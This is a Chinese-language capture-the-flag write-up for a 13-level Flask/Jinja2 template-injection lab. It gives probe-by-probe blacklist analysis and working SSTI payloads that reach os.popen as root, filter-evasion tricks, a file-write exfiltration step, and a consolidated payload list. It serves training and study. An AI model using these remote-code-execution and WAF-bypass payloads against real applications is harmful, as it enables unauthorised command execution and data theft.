# SSTILab 13 关 WP（从 0 探测版）

> 实例：`http://node5.anna.nssctf.cn:24643`（NSSCTF 动态下发，几小时回收，端口会变）
> 环境：Werkzeug/2.0.1 + Python/3.9.6 + Flask 1.1.1
> 结果：**13 / 13 关通过**，本文每一条"实测"都是真实发出去的请求与响应
> 配套：`sstilab_solve.py`（13 关最短 payload，换实例直接重跑）
>
> **复制提示**：表格里为了让竖线正常显示，原文写的是 `|`（markdown 表格的转义）。
> **从渲染后的页面复制**得到的就是正确的 `|`；如果从原始 .md 文本里复制，记得去掉反斜杠。
> 带反斜杠会让 Jinja2 语法报错，靶机回 `No this level`（而 `Hello WAF` 才是被过滤拦了）。
> 正文里的 payload 都放在代码块中，不受这个影响，可直接复制。

## 零、探测方法：先搞清楚"信号长什么样"

### 0.1 这个靶机只有四种响应

| 响应 | 含义 | 来源 |
|---|---|---|
| `Hello <内容>` | 渲染成功，结果可见 | 外层拼接后渲染 |
| `Hello WAF` | 被黑名单拦 | 关卡函数返回 `"WAF"` |
| `Hello No this level` | 模板报错（语法/运行时异常） | 外层 try/except |
| `Hello correct` / `Hello wrong` | 只回 1 bit（第 3 关专属） | 关卡函数丢弃渲染结果 |

判断"某个字符/词是否被禁"的方法：发一个只依赖它的探针，看回的是 `WAF` 还是别的：

```text
Hello WAF        -> 被过滤了
No this level    -> 报错（语法/运行时），说明没被过滤
Hello <内容>      -> 放行，且能读到内容
```

### 0.2 探针手册（每条探针在问什么）

**A. 入口与引擎**

| 探针 | 它在问什么 | 实测读数 | 用在哪 |
|---|---|---|---|
| `{{7*7}}` | 输入进模板了吗 | `49` = 进了；`WAF` = 这个容器被拦；`correct` = 进了但输出被丢；原样回显 = 没进模板 | 所有关的第一步 |
| `{{7*'7'}}` | 是哪种模板引擎 | `7777777` = Jinja2（Twig 会给 `49`） | 决定能不能用 `|attr`、`dict()` 这类 Jinja 特性 |
| `{% print(7*7) %}` | 语句块容器能用吗 | `49` = 能用 | 第 2 关的决定性探针 |

**B. 字符黑名单（每条只带一个特征字符）**

| 探针 | 它在问什么 | 实测读数 | 决定性于 |
|---|---|---|---|
| `{{ 'q' }}` / `{{ "q" }}` | 引号能写字面量吗 | `WAF` = 被拦 | 第 5、11、12、13 关 |
| `{{ a_b }}` | 下划线 | `WAF` = 被拦；空 = 放行（只是个未定义名字） | 第 6、12、13 关 |
| `{{ a.b }}` | 点号 | `No this level` = 放行（未定义对象取属性才报错） | 第 7、11、12、13 关 |
| `{{ [1] }}` | 中括号 | `WAF` = 被拦 | 第 4、11、12、13 关 |
| `{{ 1+1 }}` | 加号 | `WAF` = 被拦 | 第 11、13 关 |
| `{{ 0 }}` | 数字 | `WAF` = 被拦 | 第 9、12 关 |
| `{{ true }}` | 布尔字面量可用吗 | `True` = 可用 | 第 12、13 关（数字没了，靠它占位） |
| `{{ 'a'~'b' }}` | 拼接运算符 | `WAF`，但这个探针**同时带引号**，要交叉对照才能定论 | 第 8、11、12 关 |

**C. 起点与利用链（问"能力还在不在"）**

| 探针 | 它在问什么 | 实测读数 | 决定性于 |
|---|---|---|---|
| `{{ lipsum }}` | 起点还在吗 | `<function generate_lorem_ipsum …>` | 所有关；第 9、12 关还靠它绕开数字探容器 |
| `{{ lipsum.__globals__|length }}` | 主链第一跳通不通 | `56` = 通 | 第 6、7、8 关靠它**被拦**定位（下划线 / 点号 / `global`） |
| `{{ lipsum|attr('__globals__')|length }}` | `attr` 这条腿通不通 | `56` | 第 7 关（和上一条同为 56 → 两种写法取到同一个字典） |
| `{{ lipsum.__globals__.os }}` | 模块里有 os 吗 | `<module 'os' from '/usr/local/lib/python3.9/os.py'>` | 第 1 关 |
| `…os.popen('id').read()` | 能执行命令吗、什么权限 | `uid=0(root) gid=0(root) groups=0(root)` | 所有关；**第 3 关外带的前提**（可写） |
| `…os.popen('ls -la /app').read()` | 有可写且可读的目录吗 | 看到 `static`、`flag` | **第 3 关外带目标的选择** |

**D. 机制与读数（问"特殊设定"）**

| 探针 | 它在问什么 | 实测读数 | 决定性于 |
|---|---|---|---|
| `{{ config }}` / `{{ self }}` | 这两个名字还在吗 | `None` / `None` = **被预置置空** | 第 10 关（唯一能直接抓到这条设定的探针） |
| `{{ request }}` | 参数通道在吗 | `<Request 'http://…' [POST]>` = 在；`WAF` = 断 | 第 11 关（断）对第 12 关（在） |
| `{{ dict(a=1)|first }}` | 能"就地造字符串"吗 | `a` = 能 | **第 11 关的决定性探针**；第 12 关被拦（带数字） |
| `{{ dict(a=true)|first }}` | 数字被禁时能用布尔占位吗 | `a` = 能 | **第 12 关的决定性探针** |
| `{{ lipsum|string }}` | 有现成含特殊字符的字符串吗 | `<function generate_lorem_ipsum at 0x7f6421330b80>` | 第 13 关（里面就有下划线、点号、尖括号） |
| `{{ lipsum|string|list|batch(19)|first|last }}` | 能按位抠出字符吗 | `_` | **第 13 关的决定性探针** |
| `{{ lipsum['\x5f\x5fglobals\x5f\x5f']|length }}` | 转义能过下划线黑名单吗 | `56`（对照：直接写 → `WAF`） | **第 6 关的决定性探针** |
| `{{ lipsum['__glo'~'bals__']|length }}` | 切词能过关键词黑名单吗 | `56`（对照：直接写 → `WAF`） | **第 8 关的决定性探针** |
| 12 个关键词逐个探 | 哪些词进了黑名单 | 全部 `WAF` | 第 8 关；顺带发现 `popen` 含 `open` 也被拦 |

**E. 盲注专用（第 3 关：把"响应差异"本身当探针）**

| 探针 | 它在问什么 | 实测读数 | 用途 |
|---|---|---|---|
| `{{7*7}}` | 渲染结果会回来吗 | `correct`（不是 `49`） | 确认输出被丢弃 |
| `{{` | 坏模板会怎样 | `wrong` | 确认"异常 = wrong"这个信号 |
| `{{ [][0] }}` | 取不存在下标会抛异常吗 | `correct` | 陷阱：LookupError 被吞成 Undefined，不能当假分支 |
| `{{1/0}}` / `{{ [].pop() }}` / `{{ 'a'.nope.x }}` | 能不能造出真异常 | 都是 `wrong` | 可用的假分支信号（三个备选） |
| oracle 条件真 / 假 | 这个 oracle 成立吗 | `correct` / `wrong` | 建立逐位爆破的基础 |

**探针的四条纪律**

1. **一次只带一个特征** —— `{{ [1] }}` 同时带中括号和数字，在第 9 关被拦时无法判断是谁的问题，必须配 `{{ lipsum }}`（无数字）交叉对照才能定论。
2. **结果必须可辨认** —— `{{ lipsum.__globals__ }}` 返回 16204 字符的 dump，人眼判不了；加 `|length` 得 `56`，一眼可读还能横向比较。
3. **"报错"也是有效读数** —— `{{ a.b }}` 回 `No this level`，恰恰证明点号**没有**被禁；三种响应（`WAF` / `No this level` / `Hello <内容>`）含义完全不同。
4. **关键结论必须配对照探针** —— 说"切碎能过"就要同时给"原文被拦"：`['__glo'~'bals__']` → `56` 对 `['__globals__']` → `WAF`。只有对照才能证明是这个变换起的作用。

**两个天然测不准的东西**

1. **反斜杠**：只能写进字符串字面量，所以引号被禁的第 5、11、12、13 关**没法单独测它** —— 这是探针方法的固有盲区。
2. **被预置赋值改掉的名字**：第 10 关能探到 `config=None` / `self=None`（因为关卡是 `set ... None`）；
   如果关卡改成直接删掉，读数会变成空（未定义），那时只能靠对照其它名字来区分"被删"和"名字打错"。
### 0.3 探针设计三原则

1. **探针必须能渲染出可辨认的结果**（否则分不清"被拦"和"报错"）
2. **一次只测一个特征**（整数运算 / 单引号 / 点号 / 下划线 / 关键词……）
3. **先探容器**：两种定界符各发一次；数字被禁的关卡（第 9、12 关）两个都测不出来，
   这时改用无数字探针 `{{ lipsum }}`

### 0.4 通用起手式（六步）

```text
① 确认注入与引擎   {{7*7}} -> 49 ；{{7*'7'}} -> 7777777（Jinja2 会做字符串重复）
② 找现成对象       模板上下文白送的：lipsum / config / request / self
③ 找离开模板的路   函数 -> __globals__ -> 模块 -> os（这一跳就是从模板到 RCE）
④ 逐项探黑名单     容器 -> 字符 -> 关键词，每项一个探针
⑤ 按"被咬的零件"选写法（三抽屉：字符串从哪来 / 属性怎么取 / 结果怎么写）
⑥ 结果怎么带走     响应体 -> 文件副作用 -> 1 bit
```

---

## 一、逐关：探测 → 推理 → payload → 实测

### 第 1 关：无过滤

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{7*7}}` | `Hello 49` | 输入被当模板渲染，SSTI 确认 |
| `{{7*'7'}}` | `Hello 7777777` | Python/Jinja2 语义（字符串重复） |
| `{{ lipsum }}` | `Hello <function generate_lorem_ipsum at 0x…>` | 上下文里有 Jinja2 默认全局函数 |
| `{{ lipsum.__globals__ }}` | `Hello {'__name__': 'jinja2.utils', …}`（16204 字符） | 函数能爬到"定义它的模块"的全局字典 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | 加 `length` 只是**读数方式**：不加就是上面那块没法判读的 dump，加了得数字 |
| `{{ lipsum.__globals__.os }}` | `Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>` | 那个模块里真有 os |
| `{{ lipsum.__globals__.os.popen('id').read() }}` | `Hello uid=0(root) gid=0(root) groups=0(root)` | 完整命令执行 + root 权限 |
| `{{ lipsum.__globals__.os.popen('ls -la /app').read() }}` | `Hello total 36 … static …` | 看到 `/app`、`static`、`flag` |
| `{{ 'q' }}` / `{{ [1] }}` / `{{ 1+1 }}` / `{{ a_b }}` | `q` / `[1]` / `2` / 空 | 字符层面没有过滤 |
| `{{ a.b }}` | `Hello No this level` | 未定义对象再取属性会抛异常（后面当信号用） |

**推理**：无过滤 → 直接走最标准的全局链；`read()` 必须有（`os.system` 没有回显）。

**payload**

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符）

### 第 2 关：禁 `{{`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{7*7}}` | `Hello WAF` | `{{` 被拦 |
| `{% print(7*7) %}` | `Hello 49` | 语句块容器没被拦 |
| 换到语句块后重跑全套探针 | 全部正常 | 过滤只针对 `{{` 这一个词 |

**推理**：Jinja2 有三种定界符 —— `{{ }}`（输出表达式）、`{% %}`（语句）、`{# #}`（注释）。
`print` 语句与输出表达式语义等价，只是容器不同。

**payload**

```jinja
{% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（64 字符）

### 第 3 关：盲注（结果不返回）

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{7*7}}` | `Hello correct`（不是 49） | 渲染发生了，但**结果被丢弃** |
| `{{` | `Hello wrong` | 坏模板 → 异常 → wrong |
| `{{ [][0] }}` | `Hello correct` | 陷阱：LookupError 被吞成 Undefined，**不抛异常** |
| `{{1/0}}` | `Hello wrong` | ZeroDivisionError → 可用作假分支 |
| `{{ [].pop() }}` | `Hello wrong` | IndexError（方法调用）→ 可用 |
| `{{ 'a'.nope.x }}` | `Hello wrong` | UndefinedError → 可用 |
| `{% if …startswith('SSTILAB') %}ok{% else %}{{1/0}}{% endif %}` | `Hello correct` | 条件真 |
| 同上，把 `SSTILAB` 换成 `XXXXXXXX` | `Hello wrong` | 条件假 → oracle 成立 |
| `popen('id')` | `uid=0(root)` | 有写权限（外带前提之一） |

**推理**：输出不可见 ≠ 代码不执行。两条路：

1. **副作用外带**（2 个请求，优先）：把结果写进静态目录，再用普通 GET 取回
2. **布尔 oracle**（每次 1 bit）：真则 correct、假则 wrong，逐位问

**payload（路线 A：外带）**

```jinja
{% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}
```
然后 `GET /static/l3.txt`

**payload（路线 B：oracle）**

```jinja
{% if lipsum.__globals__.os.popen('cat /app/flag').read().startswith('SSTILAB') %}ok{% else %}{{1/0}}{% endif %}
```

**实测**：外带 → `Hello correct`，`GET /static/l3.txt` 得到 `SSTILAB{enjoy_flask_ssti}`（86 字符）

### 第 4 关：禁 `[` `]`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ [1] }}` | `Hello WAF` | 中括号被拦 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | **点号也能取字典的键** |
| `{{ lipsum.__globals__.os.popen('id').read() }}` | `uid=0(root)` | 整条链用点号走通了 |
| 其余字符探针 | 全部正常 | 只禁这两个字符 |

**推理**：Jinja2 的点号是"**先当属性取，失败再按下标取**"。`__globals__` 是 dict，
没有 `os` 这个属性 → 回退到取键。

**payload**

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符，和第 1 关同一条，只是把取键写法换成点号）

### 第 5 关：禁 `'` `"`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ 'q' }}` / `{{ "q" }}` | `Hello WAF` | 引号被拦 |
| `{{ 'a'~'b' }}` / `{{ lipsum|attr('__globals__')|length }}` | `Hello WAF` | 含引号的写法全废 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | **属性名用点号不需要引号** |
| `{{ lipsum.__globals__.os.popen(request.form.cmd).read() }}` + `cmd=cat /app/flag` | `Hello SSTILAB{…}` | 命令从参数来即可 |

**推理**：数一遍链上"哪里必须写字符串" —— 属性名（点号免引号）、命令（躲不开）。
所以**只需把命令参数化**。

**payload**

```jinja
{{ lipsum.__globals__.os.popen(request.form.cmd).read() }}
```
POST 时带上 `cmd=cat /app/flag`（若要用查询串，把 `request.form.cmd` 换成 `request.args.cmd`）

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（58 字符 + 1 个字段）

### 第 6 关：禁 `_`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ a_b }}` | `Hello WAF` | 下划线被拦 |
| `{{ lipsum.__globals__|length }}` | `Hello WAF` | 名字里有下划线，写不出来 |
| `{{ lipsum['\x5f\x5fglobals\x5f\x5f']|length }}` | `Hello 56` | **转义后能过**（决定性） |
| `{{ lipsum['__globals__']|length }}` | `Hello WAF` | 对照：直接写被拦 |
| `{{ 'q' }}` / `{{ [1] }}` | 正常 | 引号、中括号都还能用 |

**推理**：链上只有 `__globals__` 带下划线，**只需替换这一个名字**；
`\x5f` 在编译期还原成 `_`，过滤器看的是原文。

**payload**

```jinja
{{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（72 字符，零额外参数）

### 第 7 关：禁 `.`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ a.b }}` | `Hello WAF` | 点号被拦 |
| `{{ lipsum.__globals__|length }}` | `Hello WAF` | 主链走不通了 |
| `{{ lipsum['__globals__']|length }}` | `Hello 56` | **中括号能取函数属性**（决定性） |
| `{{ lipsum|attr('__globals__')|length }}` | `Hello 56` | 另一条路：`attr` 过滤器 |

**推理**：`getitem` 对字符串参数会**反向回退到属性** —— 函数不支持下标（TypeError）→
回退到按属性取。所以把每个点号换成中括号即可。

**payload**

```jinja
{{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（69 字符）

### 第 8 关：关键词黑名单

名单：class arg form value data request init global open mro base attr

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ class }}` / `{{ arg }}` / `{{ form }}` / `{{ request }}` … | 全部 `Hello WAF` | 12 个关键词逐个被拦 |
| `{{ lipsum.__globals__|length }}` | `Hello WAF` | 名字里有 `global` |
| `{{ lipsum['__glo'~'bals__']|length }}` | `Hello 56` | **切碎后能过**（决定性） |
| `{{ lipsum['__globals__']|length }}` | `Hello WAF` | 对照 |
| `{{ lipsum['__globals__']['os']['popen'] }}` | `Hello WAF` | `popen` 含 `open`，也要切 |

**推理**：`~` 在**渲染期**才拼接 → 黑名单永远看不到完整的 `global`/`open`。
只需切这两个词，其余照旧。

**payload**

```jinja
{{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（75 字符）

### 第 9 关：禁数字 `0-9`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{7*7}}` / `{{ 0 }}` / `{{ [1] }}` / `{{ 1+1 }}` | 全部 `Hello WAF` | 凡带数字的探针都被拦 |
| `{{ dict(a=1)|first }}` | `Hello WAF` | 连 kwargs 里的 1 都不行 |
| `{{ lipsum }}` | `Hello <function generate_lorem_ipsum …>` | 无数字探针 → 容器可用 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | **框架全局链本来就没有数字** |

**推理**：需要数字的只有"枚举子类下标"那条类链；框架链全是名字，天然免疫。
所以这关**不用改 payload**。

**payload**

```jinja
{{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（69 字符，零数字）

### 第 10 关：预置 `config` / `self` 为空

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ config }}` | `Hello None` | config 被置空（实测抓到） |
| `{{ self }}` | `Hello None` | self 被置空 |
| `{{ lipsum }}` | `Hello <function generate_lorem_ipsum …>` | 起点没受影响 |
| 其余字符/关键词探针 | 全部正常 | 没有字符级过滤 |

**推理**：关卡在 payload 前面拼了两条赋值语句，把这两个名字设成了 None。
被废掉的是**名字**，不是语法 → 换起点。

**payload**

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符，同第 1 关）

### 第 11 关：禁 `'` `"` `+` `request` `.` `[` `]`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ 'q' }}` / `{{ a.b }}` / `{{ [1] }}` / `{{ 1+1 }}` / `{{ request }}` | 全部 `Hello WAF` | 引号、点号、中括号、加号、request 全禁 |
| `{{ lipsum }}` / `{{ config }}` / `{{ self }}` | 正常 | 起点还在 |
| `{{ dict(a=1)|first }}` | `Hello a` | **kwargs 的键名能白嫖字符串**（决定性） |
| `{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(get=1)|first)(dict(os=1)|first) }}` | `Hello <module 'os' from '/usr/local/lib/python3.9/os.py'>` | 造名后能拿到 os |

**推理**：外部通道（引号、request）全断 → **只能在模板里造字符串**：

| 要造的 | 怎么造 |
|---|---|
| 任意名字 | 用 `dict(名=1)` 的键名，再用 `first` 过滤器取出来 |
| 斜杠 `/` | 取 `lipsum` 的 `__file__` 首字符（`/usr/local/lib/python3.9/site-packages/jinja2/utils.py`） |
| 空格 | 不用空格：`cat</app/flag`（shell 重定向） |
| 拼接 | 用 `~`（加号被禁） |

**payload**

```jinja
{% set g = lipsum|attr(dict(__globals__=1)|first) %}{% set s = g|attr(dict(get=1)|first)(dict(__file__=1)|first)|first %}{{ g|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~s~(dict(ap=1)|first)~(dict(p=1)|first)~s~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（330 字符 —— 这关的长度是黑名单逼出来的）

### 第 12 关：禁 `_` `.` 数字 `\` `'` `"` `[` `]`

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ 0 }}` / `{{ 'q' }}` / `{{ a_b }}` / `{{ a.b }}` / `{{ [1] }}` | 全部 `Hello WAF` | 数字、引号、下划线、点号、中括号全禁 |
| `{{ dict(a=1)|first }}` | `Hello WAF` | 连 kwargs 里的 1 都不行 |
| `{{ request }}` | `Hello <Request 'http://…/level/12' [POST]>` | **参数通道还在** |
| `{{ true }}` / `{{ dict(a=true)|first }}` | `Hello True` / `Hello a` | 布尔字面量顶替数字（决定性） |

**推理**：名字写不出来（连 kwargs 名都不能带下划线）→ 只能从参数取；
数字被禁 → 占位值写 `true`。躲不开的只有两个字符串：`__globals__` 和命令 → 放查询参数。

**payload**

```jinja
{% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(dict(get=true)|first)(dict(os=true)|first)|attr(dict(popen=true)|first)(r(dict(b=true)|first))|attr(dict(read=true)|first)() }}
```

查询串：

```text
?a=__globals__&b=cat /app/flag
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（246 字符 + 2 个参数）

### 第 13 关：全禁

名单：下划线、点号、反斜杠、引号、request、加号、class、init、arg、config、app、self、中括号

**探测记录（实测）**

| 探针 | 实测响应 | 推断 |
|---|---|---|
| `{{ 'q' }}` / `{{ a_b }}` / `{{ a.b }}` / `{{ [1] }}` / `{{ 1+1 }}` | 全部 `Hello WAF` | 引号、下划线、点号、中括号、加号全禁 |
| `{{ config }}` / `{{ self }}` / `{{ request }}` | 全部 `Hello WAF` | 连参数通道都断了 |
| `{{ class }}` / `{{ arg }}` / `{{ init }}` | 全部 `Hello WAF` | 关键词也禁 |
| `{{ lipsum }}` / `{{ dict(a=1)|first }}` / `{{ true }}` | 正常 / `Hello a` / `Hello True` | 起点和"dict 造串"还在（决定性） |
| `{{ lipsum|string }}` | `Hello <function generate_lorem_ipsum at 0x7f6421330b80>` | repr 里就有现成的下划线 |
| `{{ lipsum|string|list|batch(19)|first|last }}` | `Hello _` | **抠出下划线**（决定性） |

**推理**：连一个下划线都写不出来 → 从对象自身提取字符，再用它拼 dunder：

```text
第 19 个字符 = _                    （<function generate_lorem_ipsum ...> 里 "generate_" 那个下划线）
(u~u)~(dict(globals=true)|first)~(u~u)      -> "__globals__"
dict(get=true)|first                -> "get"（对字典来说 get('os') 就够，不必造 __getitem__）
斜杠 = __file__ 首字符；命令 = cat + < + / + app + / + flag
```

**payload**

```jinja
{% set u = lipsum|string|list|batch(19)|first|last %}{% set g = lipsum|attr((u~u)~(dict(globals=true)|first)~(u~u)) %}{% set q = g|attr(dict(get=true)|first) %}{% set s = q((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set c = (dict(cat=true)|first)~((lipsum|string)|first)~s~(dict(ap=true)|first)~(dict(p=true)|first)~s~(dict(flag=true)|first) %}{{ q(dict(os=true)|first)|attr(dict(popen=true)|first)(c)|attr(dict(read=true)|first)() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（439 字符）

---

## 二、速查表

| 关 | 探测结论（实测） | 只换了什么 | payload 关键片段 | 长度 |
|---|---|---|---|---|
| 1 | 无过滤 | — | 标准全局链 | 57 |
| 2 | 只禁 `{{` | 容器 | `{% print(…) %}` | 64 |
| 3 | 输出被丢弃，只回 correct/wrong | 结果通道 | 命令里加重定向 `> /app/static/l3.txt` | 86 |
| 4 | 只禁 `[` `]` | 取键语法 | `.os` 代替 `['os']` | 57 |
| 5 | 只禁 `'` `"` | 命令来源 | `popen(request.form.cmd)` + `cmd=` | 58 |
| 6 | 只禁 `_` | 那一个名字 | `lipsum['\x5f\x5fglobals\x5f\x5f']` | 72 |
| 7 | 只禁 `.` | 点号换中括号 | `lipsum['__globals__']['os'][…]` | 69 |
| 8 | 12 个关键词 | 切碎两个词 | `['__glo'~'bals__']`、`['pop'~'en']` | 75 |
| 9 | 只禁数字 | 不用换 | 同 7（框架链本就无数字） | 69 |
| 10 | config/self 被置空 | 不用换 | 同 1（起点就是 lipsum） | 57 |
| 11 | 引号 点号 中括号 加号 request | 退不掉 | `dict(名=1)` 造名 + `~` 拼命令 | 330 |
| 12 | 再加下划线和数字 | 退不掉 | 只把 `__globals__` 和命令放参数 | 246 |
| 13 | 连下划线和 request 都没了 | 退不掉 | 抠字符造 dunder | 439 |

**13 条 payload 原文（同一个代码块，直接复制）**

```text
L1  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
L2  {% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}
L3  {% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}   （随后 GET /static/l3.txt）
L4  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
L5  {{ lipsum.__globals__.os.popen(request.form.cmd).read() }}                               （附带 cmd=cat /app/flag）
L6  {{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}
L7  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
L8  {{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}
L9  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
L10 {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
L11 {% set g = lipsum|attr(dict(__globals__=1)|first) %}{% set s = g|attr(dict(get=1)|first)(dict(__file__=1)|first)|first %}{{ g|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~s~(dict(ap=1)|first)~(dict(p=1)|first)~s~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
L12 {% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(dict(get=true)|first)(dict(os=true)|first)|attr(dict(popen=true)|first)(r(dict(b=true)|first))|attr(dict(read=true)|first)() }}   （附带 ?a=__globals__&b=cat /app/flag）
L13 {% set u = lipsum|string|list|batch(19)|first|last %}{% set g = lipsum|attr((u~u)~(dict(globals=true)|first)~(u~u)) %}{% set q = g|attr(dict(get=true)|first) %}{% set s = q((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set c = (dict(cat=true)|first)~((lipsum|string)|first)~s~(dict(ap=true)|first)~(dict(p=true)|first)~s~(dict(flag=true)|first) %}{{ q(dict(os=true)|first)|attr(dict(popen=true)|first)(c)|attr(dict(read=true)|first)() }}
```

## 三、方法论总结

**三抽屉模型**（过滤禁什么，就去对应抽屉换零件）

| 抽屉 | 有哪些零件 | 什么时候用 |
|---|---|---|
| 字符串从哪来 | 字面量 / `~` 拼接 / `\x5f` 转义 / `dict(名=1)|first` / 请求参数 / 从对象抠字符 | 引号、关键词、下划线被禁 |
| 属性怎么取 | `.名` / `['名']` / `|attr('名')` / `|attr('__getitem__')('名')` / `|first` `|last` | 点号、中括号被禁 |
| 结果怎么写 | `{{ }}` / `{% print %}` / `{% if %}字面量` / 副作用写文件 | 定界符被禁 / 盲注 |

**时间差原理**：黑名单查的是**原文**；`~` 在渲染期拼接、`\x5f` 在编译期还原 →
引擎看到的永远比过滤器多。

**判断顺序**

```text
先探容器 -> 再探字符 -> 再探关键词 -> 按"被咬的零件"换写法 -> 最后才上"全套替换"
```

## 四、踩坑记录（都是这次实际踩到的）

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| 假分支选错 | 第 3 关盲注一直回 correct | `{{ [][0] }}` 的 LookupError 被吞成 Undefined | 用 `{{1/0}}` 或 `{{ [].pop() }}` |
| 参数容器不匹配 | 第 5 关回 `No this level` | 取参用 `request.args`，字段却放在 POST body | 两边对齐，或改用 `request.values` |
| 数字被禁时探不出容器 | 第 9、12 关两个容器探针都被拦 | 探针自己带数字 | 换无数字探针 `{{ lipsum }}` |
| 竖线转义被一起复制 | 第 1 关回 `No this level` | markdown 表格的转义反斜杠跟着进了 payload | 从渲染视图复制，或去掉 `\` |
| `%` 格式化毁 payload | Python 报 unsupported format character | payload 含 `%}` 或 `{%`，与格式化冲突 | 一律用字符串拼接 |
| 斜杠来源失效 | 第 11 关命令拼成 `cat<NoneappNoneflag` | Flask 的 `SESSION_COOKIE_PATH` 默认是 None | 改用 `__file__` 首字符 |
| Windows 本地验证读不到文件 | `type` 报 syntax error | cmd 的 `type` 不认正斜杠和中文路径 | 本地用 `builtins.open` 读，别走 cmd |
| 测试客户端丢 Cookie | 本地验 Cookie 通道取到空 | 手写 Cookie 头被测试客户端忽略 | 用 `client.set_cookie(k, v)` |
